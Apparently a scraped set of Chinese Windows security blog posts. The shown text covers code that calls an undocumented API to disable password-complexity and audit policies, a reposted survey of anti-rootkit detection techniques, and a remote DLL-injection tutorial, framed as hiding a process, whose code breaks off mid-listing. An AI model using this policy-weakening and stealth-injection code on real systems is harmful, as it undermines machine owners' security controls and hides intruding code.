stdcall,flat option casemap:none include \\masm32\\include\\windows.inc include \\masm32\\include\\user32.inc include \\masm32\\include\\kernel32.inc include \\masm32\\include\\masm32.inc include \\masm32\\include\\shlwapi.inc include \\masm32\\include\\shell32.incincludelib \\masm32\\lib\\user32.lib includelib \\masm32\\lib\\kernel32.lib includelib \\masm32\\lib\\masm32.lib includelib \\masm32\\lib\\shlwapi.lib includelib \\masm32\\lib\\shell32.lib.const``.data``nini db &#x27;a&#x27;,0 seclib db &#x27;scecli.dll&#x27;,0 myapi db &#x27;SceUpdateSecurityProfile&#x27;,0 mydata db 2eh,01h,00h,00h,0feh,0ffh,0ffh,0ffh,0feh,0ffh,0ffh,0ffh,0feh,0ffh,0ffh,0ffh,00h,00h,00h,00h,0feh,0ffh,0ffh,0ffh,0feh,0ffh,0ffh,0ffh,0feh,0ffh,0ffh,0ffh,0feh,0ffh,0ffh,0ffh,0feh,0ffh,0ffh,0ffh,0feh,0ffh,0ffh,0ffh,00h,00h,00h,00h ;偏移10H如为0就是禁用,为1就是启用 .data? .code start: invoke MessageBox,0,offset nini,offset nini,1 invoke LoadLibraryA,offset seclib invoke GetProcAddress,eax,offset myapi mov esi,eax push 4 mov eax,offset mydata push eax xor edi,edi inc edi push edi xor ebx,ebx push ebx call esiinvoke ExitProcess,0end start` 编译执行没问题，OK，改成C的版本，老是提示内存不能写（内嵌汇编也不行），还请教了小榕，貌似变量定义的问题 使用OD动态跟踪，发现asm版本的生成exe后执行mydata变量是在.data可读写数据段里面，而C的版本是在.rdata只读数据段里面，使用OD的时候修改数据测试可以成功，然后再修改C++代码 1234567891011121314151617`#include &lt;stdio.h&gt; #include &lt;windows.h&gt; char *sam2; int main() &#123; sam2 = new char[99]; char *sam = &quot;\\x2e\\x01\\x00\\x00\\x0fe\\x0ff\\x0ff\\x0ff&quot; &quot;\\x0fe\\x0ff\\x0ff\\x0ff\\x0fe\\x0ff\\x0ff\\x0ff&quot; &quot;\\x00\\x00\\x00\\x00\\x0fe\\x0ff\\x0ff\\x0ff&quot; &quot;\\x0fe\\x0ff\\x0ff\\x0ff\\x0fe\\x0ff\\x0ff\\x0ff&quot; &quot;\\x0fe\\x0ff\\x0ff\\x0ff\\x0fe\\x0ff\\x0ff\\x0ff&quot; &quot;\\xfe\\x0ff\\x0ff\\x0ff\\x00\\x00\\x00\\x00&quot;; memcpy(sam2, sam, 49); HINSTANCE hInst; hInst=LoadLibraryA(&quot;scecli.dll&quot;); typedef BOOL (__stdcall *MYFUNC)(int, int, char*, int); MYFUNC fun=NULL; fun=(MYFUNC)GetProcAddress(hInst,&quot;SceUpdateSecurityProfile&quot;); int i = 4; fun(NULL,TRUE,sam2,i); /* __asm &#123; mov esi,fun push 4 mov eax,sam2 push eax xor edi,edi inc edi push edi xor ebx,ebx push ebx call esi &#125; */ return 0; &#125;` 或者 123456789101112131415`#include &lt;stdio.h&gt; #include &lt;windows.h&gt; char sam[]= &quot;\\x2e\\x01\\x00\\x00\\x0fe\\x0ff\\x0ff\\x0ff&quot; &quot;\\x0fe\\x0ff\\x0ff\\x0ff\\x0fe\\x0ff\\x0ff\\x0ff&quot; &quot;\\x10\\x00\\x00\\x00\\x0fe\\x0ff\\x0ff\\x0ff&quot; &quot;\\x0fe\\x0ff\\x0ff\\x0ff\\x0fe\\x0ff\\x0ff\\x0ff&quot; &quot;\\x0fe\\x0ff\\x0ff\\x0ff\\x0fe\\x0ff\\x0ff\\x0ff&quot; &quot;\\xfe\\x0ff\\x0ff\\x0ff\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;;int main() &#123; HINSTANCE hInst; hInst=LoadLibraryA(&quot;scecli.dll&quot;); typedef BOOL (__stdcall *MYFUNC)(int, int,char*, int); MYFUNC fun=NULL; fun=(MYFUNC)GetProcAddress(hInst,&quot;SceUpdateSecurityProfile&quot;); printf(&quot;sam=0x%08X\\n&quot;,&amp;sam); printf(&quot;%s&quot;,sam); fun(NULL,TRUE,sam,4); /* __asm &#123; mov esi,fun push 4 mov eax,sam2 push eax xor edi,edi inc edi push edi xor ebx,ebx push ebx call esi &#125; */ return 0; &#125;` 发现如果SceUpdateSecurityProfile函数的第三个参数，后面如果有其它数据，会报错，要是后面大段\\x00数据的话，就通过，undocument api只能这样了，估计第三个参数应该是个什么结构。在我的Windows2003 CN SP1上测试成功（执行后，会让本地策略“密码复杂度”那项变成禁用，还有其它一些策略如审核策略也会更改，应该是第三个参数的每个位对应着不同的策略，安全选项中的似乎不会变），小榕的Windows2003 EN SP1上不能成功，估计是这个函数太底层了，应该有更高一层的函数先判断不同的操作系统版本，选择不同的参数，然后在调用SceUpdateSecurityProfile函数。 还有安全选项里面的内容，估计是其它函数，有空我也softice一下。 最后帖下关于变量定义后在内存什么地方的一段代码，不一定什么时候有用 123456789101112131415//main.cpp int a = 0; 全局初始化区 char \\*p1; 全局未初始化区 main() &#123; int b; 栈 char s\\[\\] = &quot;abc&quot;; 栈 char \\*p2; 栈 char \\*p3 = &quot;123456&quot;; 123456\\\\0在常量区，p3在栈上。 static int c =0； 全局（静态）初始化区 p1 = (char \\*)malloc(10); p2 = (char \\*)malloc(20); 分配得来得10和20字节的区域就在堆区。 strcpy(p1, &quot;123456&quot;); 123456\\\\0放在常量区，编译器可能会将它与p3所指向的&quot;123456&quot;优化成一个地方。 &#125; 全局 char *str=“\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20”; str存在.data段，是一个指针，内容为一个地址（地址在.rdata区段），这个地址指向的内容为字符串 全局 char str[]=“\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20”; str存在.data段，是一个指针，指针指向字符串","tags":""},{"title":"简单认识Anti-RootKit(ZT)","url":"/20240324/jian-dan-ren-shi-anti-rootkit-zt/","text":"转载自 简单认识Anti-RootKit(ZT) from:http://www.debugman.com/read.php?tid=646 现在RK（rootkit）和ARK(anti- rootkit)的斗争已经进行了很久，在印象中最早出来的ARK工具是冰刃(IceSword)，从冰刃开始出来到现在RK和ARK的斗争一直在继续， 目前冰刃还是在流行当中，自己感觉也正是冰刃的出来才带动了当前流行的RK和ARK的斗争 呵呵，现在很多病毒木马已经广泛的带有驱动,使用一些RK的技术和方法使自己更底层些更强大些，当前流行的ARK工具主要包括：隐藏进程检测，内核驱动检 测，SSDT检测，代码HOOK检测，注册表隐藏的检测，隐藏文件的检测等一些功能的，下面谈谈自己对一些功能的简单愚见 嘻嘻。 关于进程检测：其实最早在R3下隐藏进程的方法已经很早开始流行起来被用到各种软件上来，在R0下如断ActiveProcessLinks链，擦掉句柄表等等，一步步的发展渐渐的更强大起来一些技巧和方法开始出来和流行起来，如FUTO，phide_ex等。。。。。。 检 测隐藏进程的方法可以把一些现在流行的方法组合起来用，首先可以通过进程的EPROCESS结构中的进程活动链表ActiveProcessLinks来 进行扫描一边，可以通过进程句柄表的枚举通过EPROCESS的HANDLE_TABLE，HANDLE_TABLE结构中的 HandleTableLis链表来扫描一边来获得一些EPROCESS，可以通过定位PsLookupProcessByProcessId代码中的 PspCidTable链表扫描一边获得一些EPROCESS，PspCidTable在各系统中枚举是不太一样的，也可以通过先找出 KiWaitInListHead，KiWaitOutListHead和KiDispatcherReadyListHead这些链表然后对这些链表扫 描获得一些EPROCESS，以上具体的实现代码可以GOOGLE之网上实现的代码已经很多了，再者也可以找到内核中的线程切换SwapContext函 数进行HOOK下的，在自己实现的SwapContext函数根据线程的偏移量找出进程的EPROCESS结构，把上面获得的所有EPROCESS汇集起 来还需要判断下当前进程是否是真正的活着的：）可以通过EPROCESS里的标志位Flags（如XP 下0x248）一些标志判断下的，还要注意下对上面这些链表汇集起来是会有重复的进程的，在你自己的汇集函数中根据EPROCESS判断下的 废话了，感觉实现了上面的一些方法对付一般的隐藏进程已经足够了的，但厉害的RK还是有的，现在存在可以逃过这些方法的RK的，在进程EPROCESS的 结构里偏移0x1f8（XP SP2下）有个struct MMSUPPORT Vm结构： struct _MMSUPPORT { /* off 0x00000000 */ union LARGE_INTEGER LastTrimTime; /* off 0x00000008 */ struct MMSUPPORT_FLAGS Flags; /* off 0x0000000C */ unsigned long PageFaultCount; /* off 0x00000010 */ unsigned long PeakWorkingSetSize; /* off 0x00000014 */ unsigned long WorkingSetSize; /* off 0x00000018 */ unsigned long MinimumWorkingSetSize; /* off 0x0000001C */ unsigned long MaximumWorkingSetSize; /* off 0x00000020 */ struct _MMWSL* VmWorkingSetList; /* off 0x00000024 */ struct LIST_ENTRY WorkingSetExpansionLinks; /* off 0x0000002C */ unsigned long Claim; /* off 0x00000030 */ unsigned long NextEstimationSlot; /* off 0x00000034 */ unsigned long NextAgingSlot; /* off 0x00000038 */ unsigned long EstimatedAvailable; /* off 0x0000003C */ unsigned long GrowthSinceLastEstimate; }; 在这个结构里+0x24有个 WorkingSetExpansionLinks他也是个LIST_ENTRY链表的，遍例下他可以获得进程的EPROCESS的，如 PEPROCESS eprocess, eprocess2 eprocess =PsGetCurrentProcess(); lp=(PLIST_ENTRY)(*(PVOID )((PUCHAR)eprocess+0x1f8+0x24+4)); cur =lp-&gt;Flink; for(;cur!=lp;cur=cur-&gt;Flink) { eprocess2=(PEPROCESS)((ULONG)cur-0x1f8-0x24); PVOID session= (PVOID)(*(PULONG)((PCHAR) eprocess2+ 0x170)); if(MmIsAddressValid(session)){ AddProcess(eprocess2); } } 再 者在进程EPROCESS的结构里偏移0x0b4（XP SP2下）存在个struct _LIST_ENTRY SessionProcessLinks结构，他也是个链表的 ：）通过遍例他也可以的获得一些EPROCESS。还有个地方可以的 呵呵 在每个线程对象里（ETHREAD）偏移0x34里有个struct _KAPC_STATE ApcState 结构的在_KAPC_STATE结构里偏移0x10，再者也可以通过遍例内存来查找隐藏进程，从内存MmSystemRangeStart开始到 System进程的EPROCESS地址就可以了主要是判断这个地址是否是个有效的进程，方法挺多的如判断下是否是进程对象这个地址如果是 EPROCESS看看PID，ThreadListHead，ReadyListHead是否正确有效的等等，很多方法的应该组合起来判断下保证肯定是进 程就可以了，还可以通过HOOK一些函数的如KeUpdateRunTime，KeDispatchInterrupt等来检测隐藏进程，还可以设置下 PsSetCreateProcessNotifyRoutine在每次进程创建的时候对线程插入个APC的来进行统计检测的，其实我觉得对于检测隐藏进 程的方法技巧还有很多，伟大的WINDOWS还需要我们挖掘呀。进程的结束可以通过调用ZwTerminateProcess或者调用未公开的 PspTerminateProcess函数的，关于这个函数在网上已经很广泛了，可以通过遍例进程的每个线程调用 PspTerminateThreadByPointer的结束每个线程的，这些未公开的函数都需要事先的查找和定位的，还可以使用RKU （RkUnhooker）的内存清零大法的切换到该进程然后对该进程内存清零RtlZeroMemory，再者也可以对该进程的每个线程插入APC来结束 进程的，最后如果你有时间你也可以通过观看2K的代码自己来实现进程的结束。 内核驱动检测首先你可以通过 ZwQuerySystemInformation的SystemModuleInformation功能号来枚举内核驱动的，然后可以通过打开目录对 象,进行枚举代码就略了GOOGLE之吧，也可以通过枚举IoDriverObjectType和IoDeviceObjectType对象类型进行查找 枚举顺便把他们的DeviceObject和AttachedDevice等也枚举下吧，接着可以通过查找PsLoadedModuleList对该链进 行下枚举的，可以对这个目录对象再搜索一边的”\\\\Driver”。通过对上面这些方法的枚举可以查找到很多驱动对象了，相信现在你的驱动对象链表已经够 多了 嘿嘿，够累吧，接下来，你可以对上面你已经查找到的驱动对象的0x38偏移MajorFunction查找一边看看他的地址是否在已知的驱动地址范围内， 如不在你知道该怎么办的，再对MajorFunction里的每个例程地址找一边的从0到28也看看他们的地址是否在已知的驱动地址范围内，最后再说一种 的方法的，也可以像进程那样内存枚举的，像进程那样从MmSystemRangeStart开始枚举吧，判断下是否是PE文件有没有那几个关键PE特征 的，如MZ，PE等，看看是否存在PE文件头是否有效，看看这个地址是否已经是你检测出来的驱动地址的，避免重复的，看看你所检测出来的所有驱动对象的 MajorFunction[X]和DriverStartIo是否有在这个地址，如果有并且这个地址你先前没有检测出来没有重复的他很有可能是个未知的 驱动的，其实和进程内存查找一样的，关键是判断的，需要判断对的，肯定他是某个对象的然后你就可以把他加如到你自己的某个链表里。最后也可以通过对一些关 键函数的HOOK 如ExAllocatePool，ExAllocatePoolWithTag等在自己实现这些函数里记录下esp+0x24地址的，对这些地址进行判断 的来看看这些地址是否包含在某些内核模块当中当然还需要判断下他是否就是个PE驱动文件，这种方法就是RKU用到的方法的。驱动就说这些吧。 前面说得太多了，后面说少点吧 嘿嘿。 关于SSDT HOOK的检测，通过定位ntoskrnl.exe磁盘文件里KeServiceDescriptorTable与内存中的KeServiceDescriptorTable对各个服务函数进行比较就可以的。代码网上很多的。 关 于代码HOOK检测，我也不想说什么的，可以对内存中ntoskrnl.exe 的导入函数和导出函数与磁盘文件中的地址进行比较，也可以通过对ntoskrnl.exe PE文件里的某些节（section）进行扫描的，再加上对一些关键文件的导入函数和导出函数进行扫描，加上对某些关键驱动（如文件系统驱动）的 MajorFunction里的每个例程进行扫描，再者对IDT，GDT扫描下的。 关于注册表隐藏的检测，首先可以用到把一些注册表相关 的函数INLINE HOOK的SSDT HOOK的都恢复下再使用的其实所谓的不相关的也需要UNHOOK下的，如badrkdemo 他就HOOK了ObOpenObjectByName函数组织对注册表的访问的 具体的看情况来吧 哈哈，也可以通过对一些未公开的函数进行使用的CM系列函数的，再者可以通过分析HIVE文件的来显示注册表各个项的，通过分析HIVE文件其实也不是很 难的，了解了HIVE文件结构和HIVE文件的组织的，就可以读他了，这些资料网上可以找到的，通过读HIVE文件来给用户显示当前注册表各个项的可以的 但我并不推荐自己改写系统的HIVE文件的，如提供DELETE MODIFE等功能的我觉得如改的不好，或结构没有完全清楚的，写到HIVE文件里是错误的，那么当再次启动时系统读HIVE文件时就不好过了，自己一点 愚见，如果你够强大当然是没有问题的。 关于隐藏文件的检测，现在流行的隐藏文件的RK很多的，如Unreal.A，AK922等，自己可 以通过在驱动中自己构建IRP包自己发送给文件驱动的方法的，还有就是先恢复些关键函数的，像注册表那样的，恢复INLINE HOOK SSDT HOOK，文件驱动关键例程HOOK的，现在流行HOOK内核的完成例程的，HOOK是防不胜防的，还要注意下附加在文件系统上的一些过滤驱动的，还有就 是通过使用DeviceIoControl发送一些特殊的IoControlCode控制代码给文件系统的，这需要对文件系统的熟悉的，还有就是自己分析 磁盘文件的对FAT32，NTFS等格式文件系统自己分析来查找文件的，关于自己分析磁盘文件的，网上的信息和资料也是很多的，首先判断下属于哪个文件系 统，然后根据特定的文件系统格式自己分析的就可以的，其实这些方法的关键是怎么读和写的，读和写做到最底层，把读和写做好我想他检测文件功能是强大的。 够 了，一些ARK的功能说到这就可以了，我希望各位搞RK的和ARK的人看了之后又会作出很多厉害，强大的东西来，希望看了之后会对各位有一点帮助的，希望 可以在当前流行的RK和ARK中会有更新更强大的东西出现的，来激励我们学习和前进的，引用一位好友的话“现在感觉大部分木马病毒什么的都是用的老一套东 西的什么SSDT HOOK的。。。。。。，希望可以有些新的技术出现的”，其实现在有些RK是很牛的，其实都是一个目标的 希望技术和知识可以不断进步的 嘿嘿。一个没有未来的人:）谈谈关于RK和ARK未来的发展 RK 更底层，ARK也更底层，攻和防，RK和ARK的斗争会继续的，RK会出现固化在某个文件里，会在重装系统后还会存在，会写到硬件中。。。。。。，ARK 势必也需要对这些问题关注的。 谢谢各位看完文章的，本人一介小菜知识有限，以上是自己的一点愚见，如有什么错误和不足之处，请各位指教。 本文之中的有些知识是朋友和一些牛人给予帮助，谢谢他们的帮助。 作者：single 2007-10-19","tags":""},{"title":"【Windows核心编程学习笔记】远程注入ＤＬＬ","url":"/20240324/windows-he-xin-bian-cheng-xue-xi-bi-ji-yuan-cheng-zhu-ru-dll/","text":"转载自 【Windows核心编程学习笔记】远程注入ＤＬＬ 远程注入DLL 一、概述 为了隐藏自身的进程信息，我们希望将进程作为一个合法进程的线程运行。由于系统进程间不允许直接操作资源，因而我们需要在合法进程内部创建一个线程，为其指定要执行的代码。一种简单的方式是令远程线程载入一个我们编写的DLL，通过DllMain()函数执行我们需要的代码。基本思路是将LoadLibrary()函数作为一个线程函数来调用： CreateRemoteThread()----&gt;LoadLibrary()----&gt;DllMain() 这里的核心函数是CreateRemoteThread()，它用来在远程进程中创建一新线程。我们来看一下这个函数： HANDLE WINAPI CreateRemoteThread( HANDLE hProcess, //要创建远程线程的进程句柄 LPSECURITY_ATTRIBUTES lpThreadAttributes, //用于定义新线程的安全属性，这里设为NULL采用默认值即可 SIZE_T dwStackSize, //初始化线程堆栈大小，NULL为默认大小 LPTHREAD_START_ROUTINE lpStartAddress, //线程函数开始的地址 LPVOID lpParameter, //线程函数参数 DWORD dwCreationFlags, //函数表示创建线程后线程的运行状态 LPDWORD lpThreadId //返回线程ID，不关心可以设为NULL不返回 ); 使用这个函数关键要解决三个参数问题： l 获得远程线程的进程句柄，而且要确保相应权限 l 获取远程进程中线程函数的开始地址，而非本地地址 l 向远程线程成功传入DLL路径字符串 解决了这三个问题，我们的远程注入DLL就基本完成了。接下来，这篇笔记的组织结构如下： F 获取远程进程句柄 l 枚举系统进程 l 提升进程权限 F 获取LoadLibrary()函数在远程进程中的地址 F 向远程线程中写入DLL路径字符串 l 利用VirtualAllocEx()分配远程地址空间 l 利用WriteProcessMemory()写入远程地址空间 F 程序源码 F 运行测试 二、获取远程进程句柄 我们主要利用OpenProcess()函数来获得要注入的进程的句柄，句柄是系统中可以起到唯一标识作用的一个对象。我们来看一下OpenProcess()函数： HANDLE WINAPI OpenProcess( DWORD dwDesiredAccess, //获取的句柄的访问权限 BOOL bInheritHandle, //是否可为新进程继承 DWORD dwProcessId //要获取句柄的进程ID ); 句柄的访问权限是指我们要使用该进程的句柄做哪些访问操作，对于远程注入DLL来说，主要有： PROCESS_CREATE_THREAD | //For CreateRemoteThread() PROCESS_VM_OPERATION | //For VirtualAllocEx()/VirtualFreeEx() PROCESS_VM_WRITE //For WriteProcessMemory(0 当然，我们也可以直接设为最高权限：PROCESS_ALL_ACCESS。 第二个参数说明了是否可为新进程继承，第三个参数需要借助我们编写的子函数ListProcess()来获得。另外需要注意的是，对于很多系统和服务进程而言，获取其带有写权限的句柄需要主调进程拥有调试权限，我们利用子函数EnableDebugPriv()来提升权限。这样在XP下就足够了，在VISTA之后的系统中需要进一步提升另一个隐藏权限，这里只讨论在XP上的情况。 l ListProcess() 我们使用ToolHelpAPI获取当前运行程序的信息，从而编写适合自己需要的工具（@MSDN）。它支持的平台比较广泛，可以在 Windows CE 下使用。在 Windows Mobile SDK 的 Samples 里面有一个 PViewCE 的样例程序，就是用这个来查看进程和线程信息的。 使用方法就是先用 CreateToolhelp32Snapshot 将当前系统的进程、线程、DLL、堆的信息保存到一个缓冲区，这就是一个系统快照。如果你只是对进程信息感兴趣，那么只要包含 TH32CS_SNAPPROCESS 标志即可。 常见标志如下： TH32CS_SNAPHEAPLIST：列举th32ProcessID指定进程中的堆 TH32CS_SNAPMODULE：列举th32ProcessID指定进程中的模块 TH32CS_SNAPPROCESS：列举系统范围内的所有进程 TH32CS_SNAPTHREAD：列举系统范围内的所有线程 函数执行成功返回快照句柄，否则返回INVALID_HANDLE_VALUE。 得到系统快照句柄后，我们调用Process32First和Process32Next来依次获取系统中每个进程的信息，将信息存入PROCESSENTRY32结构体中，该结构体中存放着进程的主要信息，如 DWORD th32ProcessID; //进程ID DWORD th32ModuleID; //进程模块ID CHAR szExeFile[MAX_PATH]; //进程的可执行文件名 这两个函数当枚举到进程时返回TRUE，否则返回FALSE。 然后调用一次 Process32First 函数，从快照中获取第一个进程，然后重复调用 Process32Next，直到函数返回 FALSE 为止，这样将遍历快照中进程列表。这两个函数都带两个参数，它们分别是快照句柄和一个 PROCESSENTRY32 结构。调用完 Process32First 或 Process32Next 之后，PROCESSENTRY32 中将包含系统中某个进程的关键信息。其中进程 ID 就存储在此结构的 th32ProcessID。此 ID 传给 OpenProcess API 可以获得该进程的句柄。对应的可执行文件名及其存放路径存放在 szExeFile 结构成员中。在该结构中还可以找到其它一些有用的信息。 需要注意的是：在调用 Process32First() 之前，要将 PROCESSENTRY32 结构的 dwSize 成员设置成 sizeof(PROCESSENTRY32)。 然后再用 Process32First、Process32Next 来枚举进程。使用结束后要调用 CloseHandle 来释放保存的系统快照。具体程序代码如下： //利用ToolHelp32库来枚举当前系统进程 #include #include #include #include int ListProcess() { //获取系统快照 HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //不要写错CreateToolhelp32Snapshot() if (hProcessSnap == INVALID_HANDLE_VALUE) { printf(“CreateToolHelp32Snapshot error!\\n”); return -1; } //创建单个进程快照结构体，初始化大小 PROCESSENTRY32 pe32; pe32.dwSize = sizeof(PROCESSENTRY32); //务必提前初始化，否则默认的大小不一定满足要求 //初始化缓冲区 WCHAR buff[1024] = {0}; //PROCESSENTRY32中的szExeFile为WCHAR类型数组，此处应一致，使用Unicode码 //枚举系统快照链表中的第一个进程项目 BOOL bProcess = Process32First(hProcessSnap, &amp;pe32); while (bProcess) { //格式化进程名和进程ID，这里要使用printf的宽字符版 //格式字符串“”都需要用L转换为宽字符形式 wsprintf(buff, L&quot;FileName:%-30sID:%-6d\\r\\n&quot;, pe32.szExeFile, pe32.th32ProcessID); wprintf(L&quot;%s\\n&quot;,buff); //缓冲区复位 memset(buff, 0, sizeof(buff)); //继续枚举下一个进程 bProcess = Process32Next(hProcessSnap, &amp;pe32); } CloseHandle(hProcessSnap); return 0; } l EnableDebugPriv() 提升权限主要利用下面四个函数： GetCurrentProcessID() //得到当前进程的ID OpenProcessToken() //得到进程的令牌句柄 LookupPrivilegeValue() //查询进程的权限 AdjustTokenPrivileges() //调整令牌权限 进程的权限设置存储在令牌句柄中，我们需要先获取进程的令牌句柄，其次获取进程中权限类型的LUID值，利用此值来设置进程新的权限，具体函数调用顺序如下： OpenProcessToken()----&gt;LookupPrivilegeValue()----&gt;AdjustTokenPrivileges() 具体代码如下： #include #include int EnableDebugPriv(const WCHAR *name) { HANDLE hToken; //进程令牌句柄 TOKEN_PRIVILEGES tp; //TOKEN_PRIVILEGES结构体，其中包含一个【类型+操作】的权限数组 LUID luid; //上述结构体中的类型值 //打开进程令牌环 //GetCurrentProcess()获取当前进程的伪句柄，只会指向当前进程或者线程句柄，随时变化 if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &amp;hToken)) { printf(“OpenProcessToken error\\n”); return -8; } //获得本地进程name所代表的权限类型的局部唯一ID if (!LookupPrivilegeValue(NULL, name, &amp;luid)) { printf(“LookupPrivilegeValue error\\n”); } tp.PrivilegeCount = 1; //权限数组中只有一个“元素” tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; //权限操作 tp.Privileges[0].Luid = luid; //权限类型 //调整进程权限 if (!AdjustTokenPrivileges(hToken, 0, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) { printf(“AdjustTokenPrivileges error!\\n”); return -9; } return 0; } 三、获取LoadLibrary()的远程地址 对于Windows系统而言，本地进程和远程进程中的Kernel32.dll被映射到地址空间的同一内存地址，因而只要获取本地进程中LoadLibrary()的地址，在远程进程中也同样是这个地址，可以直接传给CreateRemoteThread()： LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(“kernel32.dll”)), “LoadLibraryA”); GetProcAddress函数检索指定的动态链接库(DLL)中的输出库函数地址。 函数原型： FARPROC GetProcAddress( HMODULE hModule, // DLL模块句柄 LPCSTR lpProcName // 函数名，以NULL结尾的字符串 ); 返回值： 如果函数调用成功，返回值是DLL中的输出函数地址。 如果函数调用失败，返回值是NULL。得到进一步的错误信息，调用函数GetLastError。 四、向远程进程中写入DLL路径字符串 l VirtualAllocEx() 如果直接向CreateRemoteThread()传入DLL路径，如”C:\\\\Windows\\\\System32\\\\MyDLL.dll”那么实际向远程线程传递的是一个本地的指针值，这个值在远程进程的地址空间中是没有意义的。所以我们需要使用VirtualAllocEx()函数在远程进程中先分配一段空间，用于直接写入我们的DLL路径。 函数原形： LPVOID VirtualAllocEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect ); hProcess： 申请内存所在的进程句柄。 lpAddress： 保留页面的内存地址；一般用NULL自动分配 。 dwSize： 欲分配的内存大小，字节单位；注意实际分 配的内存大小是页内存大小的整数倍。 我们这里的实际代码为： //在远程进程中分配内存，准备拷入DLL路径字符串 //取得当前DLL路径 char DllPath[260]; //Windows路径最大为 GetCurrentDirectoryA(260, DllPath); //获取当前进程执行目录 printf(“Proces***e Directory is %s\\n”, DllPath); strcat(DllPath, “\\\\…\\\\Debug\\\\MyDLL.dll”); //链接到DLL路径 LPVOID pRemoteDllPath = VirtualAllocEx(hRemoteProcess, NULL, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE); if (pRemoteDllPath == NULL) { printf(“VirtualAllocEx error\\n”); return -3; } l WriteProcessMemory() 我们利用该函数直接向远程进程中分配好的空间中写入DLL路径字符串 BOOL WriteProcessMemory( HANDLE hProcess, // 进程的句柄，是用OpenProcess打开的 LPVOID lpBaseAddress, // 要写入的起始地址 LPVOID lpBuffer, // 写入的缓存区 DWORD nSize, // 要写入缓存区的大小 LPDWORD lpNumberOfBytesWritten // 这个是返回实际写入的字节。 ); 我们这里的实际代码为： //向远程进程空间中写入DLL路径字符串 printf(“DllPath is %s\\n”, DllPath); DWORD Size; if (WriteProcessMemory(hRemoteProcess, pRemoteDllPath, DllPath, strlen(DllPath) +1, &amp;Size) == NULL) { printf(“WriteProcessMemory error\\n”); return -4; } printf(“WriteRrmoyrProcess Size is %d\\n\\n”, Size); 五、程序源码 F DLL****源码： #include #include #include BOOL APIENTRY DllMain(HINSTANCE hInstDll, DWORD fdwReason, PVOID fImpLoad) { switch (fdwReason) { case DLL_PROCESS_ATTACH : { //The DLL is being mapped into the process’s address space. //DWORD ThreadId; //CreateThread(NULL, NULL, MessageThread, NULL, NULL, &amp;ThreadId); MessageBox(NULL, L&quot;DLL has been mapped!“, L&quot;1st RemoteThread”, MB_OK); //打开文件，定义文件指针，指定打开方式为写+追加 FILE *fp = fopen(“C:\\\\test.txt”, “w”); //打开方式参数为字符串 //文件读写函数： //读写字符：getc(), putc(); 读写字符串：fgets(), fputs() //向标准输入输出读入写出： //getchar(), putchar(); gets(0, puts(0; fputs(“一个DLL测试文本\\n”, fp); //printf(“Test finished\\n”); //关闭文件指针，释放内存 fclose(fp); } case DLL_THREAD_ATTACH: //A Thread is being created. MessageBox(NULL, L&quot;RemoteThread has been created!“, L&quot;2nd RemoteThread”, MB_OK); break; case DLL_THREAD_DETACH: //A Thtread is exiting cleanly. MessageBox(NULL, L&quot;RemoteThread exit!“, L&quot;13rd RemoteThread”, MB_OK); break; case DLL_PROCESS_DETACH: //The DLL is being ummapped from the process’ address space MessageBox(NULL, L&quot;DLL has been unmapped!“, L&quot;4th RemoteThread”, MB_OK); break; } return TRUE; //Used only for DLL_PROCESS_ATTACH } F RemoteInjectExe.cpp #include #include #include #include #include extern int ListProcess(); extern int EnableDebugPriv(const WCHAR *); int _tmain(int argc, TCHAR *argv[], TCHAR *env[]) { //为了成功使用CreateRemoteThread()函数，必须： //1.利用OpenProcess()获得远程进程的句柄 //2.利用VirtualAllocEx(),WriteProcessMemory()写入DLL路径字符串 //3.获得远程进程中LoadLibrary()的确切地址 //输入进程ID获得进程句柄 char YesNo; printf(“是否查看当前进程列表获得进程ID: Y or N?”); scanf(“%c”, &amp;YesNo); Sleep(250); if (YesNo == ‘Y’ || YesNo == ‘y’) ListProcess(); printf(“请输入要注入的进程ID【‘’表示自身进程】：\\n”); DWORD dwRemoteProcessId; scanf(“%d”,&amp;dwRemoteProcessId); //如果输入“”表示向自身进程注入 if (dwRemoteProcessId == 0) dwRemoteProcessId = GetCurrentProcessId(); //获得调试权限 if (EnableDebugPriv(SE_DEBUG_NAME)) { printf(“Add Privilege error\\n”); return -1; } //调用OpenProcess()获得句柄 HANDLE hRemoteProcess; if ((hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwRemoteProcessId)) == NULL) { printf(“OpenProcess error\\n”); printf(“Error Code:%d\\n”,GetLastError()); system(“pause”); return -2; } //在远程进程中分配内存，准备拷入DLL路径字符串 //取得当前DLL路径 char DllPath[260]; //Windows路径最大为 GetCurrentDirectoryA(260, DllPath); //获取当前进程执行目录 printf(“Proces***e Directory is %s\\n”, DllPath); strcat(DllPath, “\\\\…\\\\Debug\\\\MyDLL.dll”); //链接到DLL路径 LPVOID pRemoteDllPath = VirtualAllocEx(hRemoteProcess, NULL, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE); if (pRemoteDllPath == NULL) { printf(“VirtualAllocEx error\\n”); return -3; } //向远程进程空间中写入DLL路径字符串 printf(“DllPath is %s\\n”, DllPath); DWORD Size; if (WriteProcessMemory(hRemoteProcess, pRemoteDllPath, DllPath, strlen(DllPath) +1, &amp;Size) == NULL) { printf(“WriteProcessMemory error\\n”); return -4; } printf(“WriteRrmoyrProcess Size is %d\\n\\n”, Size); 